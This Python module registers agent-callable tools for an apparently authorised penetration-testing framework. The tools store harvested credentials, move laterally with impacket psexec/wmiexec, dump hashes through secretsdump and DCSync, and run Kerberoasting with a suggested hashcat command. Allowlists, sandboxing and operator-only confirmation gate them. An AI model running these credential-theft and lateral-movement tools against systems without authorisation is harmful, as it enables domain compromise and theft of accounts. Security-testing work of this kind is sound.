"""Credentials MCP tool registration."""

from __future__ import annotations

import time
from pathlib import Path
from typing import Any

from tools.credential_store import CredentialRecord, CredentialStore
from tools.mcp_shared import _attempt_dir, check_targets_allowlist
from tools.mcp_tools.registry import ToolContext
from tools.mcp_tools.sandbox_exec import run_tool_argv_in_sandbox
from tools.validation_utils import validate_ntlm_hash, validate_target_or_ip


def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    search = ctx.search
    nvd = ctx.nvd
    researcher = ctx.researcher
    audit_tool = ctx.audit_tool
    require_allowlist = ctx.require_allowlist

    # Ã¢â€â‚¬Ã¢â€â‚¬ Encrypted credential vault (Tier 0 item 0.3, Phase B) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
    # Stable per-target store (NOT per-attempt, so creds persist across the
    # engagement). target_ip is IPv4-validated before use so the path can't
    # traverse out of the workspace. The secret field is Fernet-encrypted at
    # rest by CredentialStore; free-text notes are encrypted too. ``password``
    # args are redacted in the audit log. Agent-callable tools cannot promote a
    # credential to confirmed; that remains an authenticated operator action.
    def _cred_store_dir(target_ip: str) -> Path:
        return workspace / "credentials" / target_ip

    @mcp.tool()
    @require_allowlist()
    def cred_store_add(
        target_ip: str,
        username: str,
        password: str = "",
        credential_type: str = "password",
        source_host: str = "",
        target_host: str = "",
        notes: str = "",
    ) -> str:
        """Store a harvested or known credential for a target in the encrypted credential vault. Secrets and free-text notes are Fernet-encrypted at rest under exploit_workspace/credentials/<target_ip>/credentials.jsonl and are never written to the audit log in cleartext. Records are added UNCONFIRMED (confirmed=False); only an authenticated operator can confirm a credential after reviewing successful reuse evidence. credential_type: password | hash | token | key."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."
        if not username or not username.strip():
            return "BLOCKED: username is required."
        ctype = (credential_type or "password").strip().lower() or "password"
        if ctype not in {"password", "hash", "token", "key"}:
            return f"BLOCKED: unsupported credential_type '{ctype}'. Allowed: password, hash, token, key."
        if not (password or "").strip():
            return "BLOCKED: password/secret is required (use credential_type='hash' with an NTLM/Kerberos hash if that is what you have)."

        store = CredentialStore(_cred_store_dir(target_ip), workspace_root=workspace)
        try:
            store.assert_writable()
        except RuntimeError as exc:
            return f"CRED_STORE_ADD: REFUSED -- {exc}"
        before = len(store.all_credentials())
        rec = CredentialRecord(
            timestamp=time.time(),
            source_host=(source_host or target_ip).strip(),
            target_host=(target_host or target_ip).strip(),
            username=username.strip(),
            password=password,
            credential_type=ctype,
            source_action="cred_store_add",
            confirmed=False,
            notes=(notes or "").strip(),
        )
        store.add(rec)
        after = len(store.all_credentials())
        stored = "stored" if after > before else "duplicate (already present -- not re-added)"
        enc = "ENABLED" if store.encryption_enabled else "DISABLED (plaintext fallback -- install cryptography)"
        return (
            f"CRED_STORE_ADD: {stored}\n"
            f"TARGET: {target_ip}\n"
            f"USERNAME: {rec.username}\n"
            f"TYPE: {rec.credential_type}\n"
            f"CONFIRMED: False (operator confirmation required after reviewing successful reuse evidence)\n"
            f"ENCRYPTION_AT_REST: {enc}\n"
            f"STORE: {store.store_path}"
        )

    @mcp.tool()
    @require_allowlist()
    def cred_store_get(target_ip: str, username: str = "", target_host: str = "", include_secret: bool = False) -> str:
        """Retrieve stored credentials for a target from the encrypted vault. By default returns a SAFE summary (secrets masked). Set include_secret=True WITH a specific username to reveal the decrypted secret for reuse in lateral_exec/dump_credentials -- only do this in full_access mode against an authorized target. With username empty, lists all credentials for the target with secrets masked."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."
        if include_secret and (config or {}).get("exploit", {}).get("permission") != "full_access":
            return "CRED_STORE_GET: BLOCKED -- revealing credential secrets requires exploit.permission=full_access."

        store = CredentialStore(_cred_store_dir(target_ip), workspace_root=workspace)
        recs = store.all_credentials()
        if target_host.strip():
            recs = [r for r in recs if r.target_host == target_host.strip()]
        if username.strip():
            recs = [r for r in recs if r.username == username.strip()]
        if not recs:
            who = f" username={username.strip()}" if username.strip() else ""
            return f"CRED_STORE_GET: no credentials stored for target {target_ip}{who}"

        reveal = bool(include_secret) and bool(username.strip())
        lines = [f"CRED_STORE_GET: {len(recs)} credential(s) for {target_ip}", ""]
        for r in recs:
            lines.append(f"  USERNAME: {r.username}")
            lines.append(f"  TYPE: {r.credential_type}")
            lines.append(f"  TARGET_HOST: {r.target_host}")
            lines.append(f"  SOURCE_HOST: {r.source_host}")
            lines.append(f"  CONFIRMED: {r.confirmed}")
            lines.append(f"  SOURCE_ACTION: {r.source_action}")
            if reveal:
                lines.append(f"  SECRET: {r.password}")
            else:
                lines.append("  SECRET: <masked -- set include_secret=True with a username to reveal>")
            if r.notes and reveal:
                lines.append(f"  NOTES: {r.notes}")
            lines.append("")
        return "\n".join(lines)

    @mcp.tool()
    @require_allowlist()
    def cred_store_list(target_ip: str) -> str:
        """List all stored credentials for a target as a safe summary (no cleartext secrets). Shows username, type, target/source host, and confirmed status for each record in the encrypted vault, plus whether at-rest encryption is active."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."

        store = CredentialStore(_cred_store_dir(target_ip), workspace_root=workspace)
        recs = store.all_credentials()
        enc = "ENABLED" if store.encryption_enabled else "DISABLED (plaintext fallback -- install cryptography)"
        if not recs:
            return (
                f"CRED_STORE_LIST: no credentials stored for target {target_ip}\n"
                f"ENCRYPTION_AT_REST: {enc}\nSTORE: {store.store_path}"
            )
        lines = [f"CRED_STORE_LIST: {len(recs)} credential(s) for {target_ip}", ""]
        for r in recs:
            lines.append(
                f"  {r.target_host}: {r.username}/{r.credential_type} confirmed={r.confirmed} (source: {r.source_action})"
            )
        lines.append("")
        lines.append(f"ENCRYPTION_AT_REST: {enc}")
        return "\n".join(lines)

    @mcp.tool()
    @audit_tool
    def cred_store_confirm() -> str:
        """Compatibility shim: agent calls cannot certify successful authentication.

        Confirmation is available only to an authenticated operator through the
        run credentials UI/API after reviewing the evidence. A caller-supplied
        ``validated`` flag is not evidence and is intentionally absent here.
        """
        return (
            "CRED_STORE_CONFIRM: BLOCKED -- agent-initiated confirmation is disabled. "
            "An authenticated operator must review successful reuse evidence."
        )

    @mcp.tool()
    @require_allowlist()
    def lateral_exec(
        target_ip: str,
        method: str = "psexec",
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
        command: str = "",
    ) -> str:
        """Execute a command on a remote Windows host via impacket lateral-movement tools. Methods: wmiexec, smbexec, psexec, atexec. Provide either a plaintext password or an NTLM hash (format LM:NT or just NT). Use after obtaining credentials to move laterally across a Windows network."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."
        if not method or not method.strip():
            return "BLOCKED: method is required."
        if not username or not username.strip():
            return "BLOCKED: username is required."

        m = method.strip().lower()
        allowed_methods = {"wmiexec", "smbexec", "psexec", "atexec"}
        if m not in allowed_methods:
            return f"BLOCKED: unsupported method '{m}'. Allowed: {', '.join(allowed_methods)}"

        has_secret = bool(password.strip()) or bool(ntlm_hash.strip())
        if not has_secret:
            return "BLOCKED: either password or ntlm_hash must be provided."

        # Build impacket command as an argv list (no shell) so password / hash /
        # username / command are literal arguments and cannot inject into a
        # shell string.
        impacket_bin = f"impacket-{m}"
        argv = [impacket_bin]
        if ntlm_hash.strip():
            h = ntlm_hash.strip()
            if not validate_ntlm_hash(h):
                return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
            argv.extend(["-hashes", f":{h.split(':')[-1]}"])
        else:
            argv.extend(["-password", password.strip()])
        argv.append(f"{username}@{target_ip}")
        if command:
            argv.append(command)
        attempt_dir, attempt_id = _attempt_dir(workspace)
        status, returncode, output, elapsed = run_tool_argv_in_sandbox(
            ctx, argv, target_ip=target_ip, timeout=120, tool_name="lateral_exec", max_chars=4000
        )
        return (
            f"LATERAL_EXEC_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"METHOD: {m}\n"
            f"TARGET: {target_ip}\n"
            f"USER: {username}\n"
            f"COMMAND: {command}\n"
            f"DURATION: {elapsed:.1f}s\n"
            f"OUTPUT:\n{output}"
        )

    @mcp.tool()
    @require_allowlist()
    def dump_credentials(
        target_ip: str,
        method: str = "sam",
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
        domain: str = "",
        output_file: str = "",
        target_user: str = "",
    ) -> str:
        """Dump credentials from a target using secretsdump, mimikatz, or local SAM/LSASS extraction. Methods: secretsdump (remote via impacket), sam_local (local registry hives), mimikatz (if binary available), lsass (procdump + mimikatz), dcsync (impacket-secretsdump over DRSUAPI against a domain controller -- requires an account with DS-Replication-Get-Changes privileges; target_ip must be the DC; optional target_user dumps a single account). Use after gaining admin access to harvest hashes for offline cracking or pass-the-hash."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."
        if not method or not method.strip():
            return "BLOCKED: method is required."

        m = method.strip().lower()
        allowed_methods = {"secretsdump", "sam_local", "mimikatz", "lsass", "dcsync"}
        if m not in allowed_methods:
            return f"BLOCKED: unsupported method '{m}'. Allowed: {', '.join(allowed_methods)}"

        if m in {"sam_local", "mimikatz", "lsass"}:
            return (
                f"BLOCKED: {m} reads credentials from the local operating system, not target {target_ip}. "
                "Host-local credential extraction is disabled."
            )

        attempt_dir, attempt_id = _attempt_dir(workspace)
        start = time.monotonic()

        if m == "secretsdump":
            if not username.strip():
                return "BLOCKED: username is required for secretsdump."
            has_secret = bool(password.strip()) or bool(ntlm_hash.strip())
            if not has_secret:
                return "BLOCKED: either password or ntlm_hash must be provided for secretsdump."

            d = domain.strip()
            target = f"{d}/" if d else ""
            target += f"{username.strip()}"
            if password.strip():
                target += f":{password.strip()}"
            target += f"@{target_ip}"

            # H1: argv list (no shell) so password/domain/username are literal
            # arguments and cannot inject into a shell string.
            argv = ["impacket-secretsdump", target]
            if ntlm_hash.strip():
                h = ntlm_hash.strip()
                argv.extend(["-hashes", f":{h.split(':')[-1]}"])

            status, returncode, output, _elapsed = run_tool_argv_in_sandbox(
                ctx, argv, target_ip=target_ip, timeout=300, tool_name="dump_credentials"
            )

        elif m == "dcsync":
            # DCSync via impacket-secretsdump over DRSUAPI against a domain
            # controller. target_ip MUST be the DC (already allowlist-gated by
            # @require_allowlist); the caller needs an account with
            # DS-Replication-Get-Changes / Get-Changes-All privileges. -just-dc
            # pulls NTDS hashes only (no plaintext/LM history); -just-dc-user
            # optionally scopes to one account. Output goes to attempt_dir.
            if not username.strip():
                return "BLOCKED: username is required for dcsync."
            has_secret = bool(password.strip()) or bool(ntlm_hash.strip())
            if not has_secret:
                return "BLOCKED: either password or ntlm_hash must be provided for dcsync."

            d = domain.strip()
            target = f"{d}/" if d else ""
            target += f"{username.strip()}"
            if password.strip():
                target += f":{password.strip()}"
            target += f"@{target_ip}"

            # H1: argv list (no shell) so password/domain/username are literal
            # arguments and cannot inject into a shell string.
            argv = ["impacket-secretsdump", target]
            if ntlm_hash.strip():
                h = ntlm_hash.strip()
                argv.extend(["-hashes", f":{h.split(':')[-1]}"])
            argv.append("-just-dc")
            tu = target_user.strip()
            if tu:
                argv.extend(["-just-dc-user", tu])
            argv.extend(["-outputfile", str(attempt_dir / "ntds_hashes")])

            status, returncode, output, _elapsed = run_tool_argv_in_sandbox(
                ctx, argv, target_ip=target_ip, timeout=300, tool_name="dump_credentials"
            )

        elapsed = time.monotonic() - start
        return (
            f"CRED_DUMP_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"METHOD: {m}\n"
            f"TARGET: {target_ip}\n"
            f"DURATION: {elapsed:.1f}s\n"
            f"OUTPUT:\n{output}"
        )

    @mcp.tool()
    @require_allowlist()
    def kerberoast(
        target_ip: str, domain: str = "", username: str = "", password: str = "", ntlm_hash: str = "", dc_ip: str = ""
    ) -> str:
        """Perform Kerberoasting against a Windows domain to extract TGS service tickets for offline hash cracking. Uses impacket GetUserSPNs.py. Provide domain, credentials (password or NTLM hash), and optionally the DC IP. Returns the path to the captured tickets file and the recommended hashcat command."""
        if not target_ip or not target_ip.strip():
            return "BLOCKED: target_ip is required."
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."
        if not domain or not domain.strip():
            return "BLOCKED: domain is required."

        has_secret = bool(password.strip()) or bool(ntlm_hash.strip())
        if not has_secret:
            return "BLOCKED: either password or ntlm_hash must be provided."

        d = domain.strip()
        dc = dc_ip.strip() or target_ip
        if dc and not validate_target_or_ip(dc):
            return "ERROR: Invalid target for dc_ip (IP or domain)."
        # Tool-layer target lock: dc_ip is an impacket -dc-ip egress target. If
        # the operator supplies a DC other than the runtime target, gate it
        # through the allowlist so kerberoast cannot pivot to an off-target DC.
        # (@require_allowlist only covers target_ip; dc is the secondary IP.)
        if dc != target_ip:
            allowed, reason = check_targets_allowlist([dc], config)
            if not allowed:
                return f"BLOCKED: {reason}\nTOOL: kerberoast\nDC_IP: {dc}"

        attempt_dir, attempt_id = _attempt_dir(workspace)
        tickets_file = attempt_dir / "kerberoast_tickets.txt"

        target = f"{d}/"
        if username.strip():
            target += f"{username.strip()}"
            if password.strip():
                target += f":{password.strip()}"
        target += f"@{target_ip}"

        # H1: argv list (no shell) so domain/username/password/hash are literal
        # arguments and cannot inject into a shell string.
        argv = ["impacket-GetUserSPNs.py", "-dc-ip", dc, "-request", target]
        if ntlm_hash.strip():
            h = ntlm_hash.strip()
            argv.extend(["-hashes", f":{h.split(':')[-1]}"])
        argv.extend(["-outputfile", str(tickets_file)])

        status, returncode, output, elapsed = run_tool_argv_in_sandbox(
            ctx,
            argv,
            target_ip=target_ip,
            targets=[target_ip, dc],
            timeout=300,
            tool_name="kerberoast",
        )

        file_size = tickets_file.stat().st_size if tickets_file.exists() else 0

        return (
            f"KERBEROAST_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"DOMAIN: {d}\n"
            f"DC_IP: {dc}\n"
            f"TARGET: {target_ip}\n"
            f"TICKETS_FILE: {tickets_file}\n"
            f"TICKETS_SIZE: {file_size} bytes\n"
            f"DURATION: {elapsed:.1f}s\n"
            f"CRACK_COMMAND: hashcat -m 13100 -a 0 {tickets_file} rockyou.txt\n"
            f"OUTPUT:\n{output}"
        )
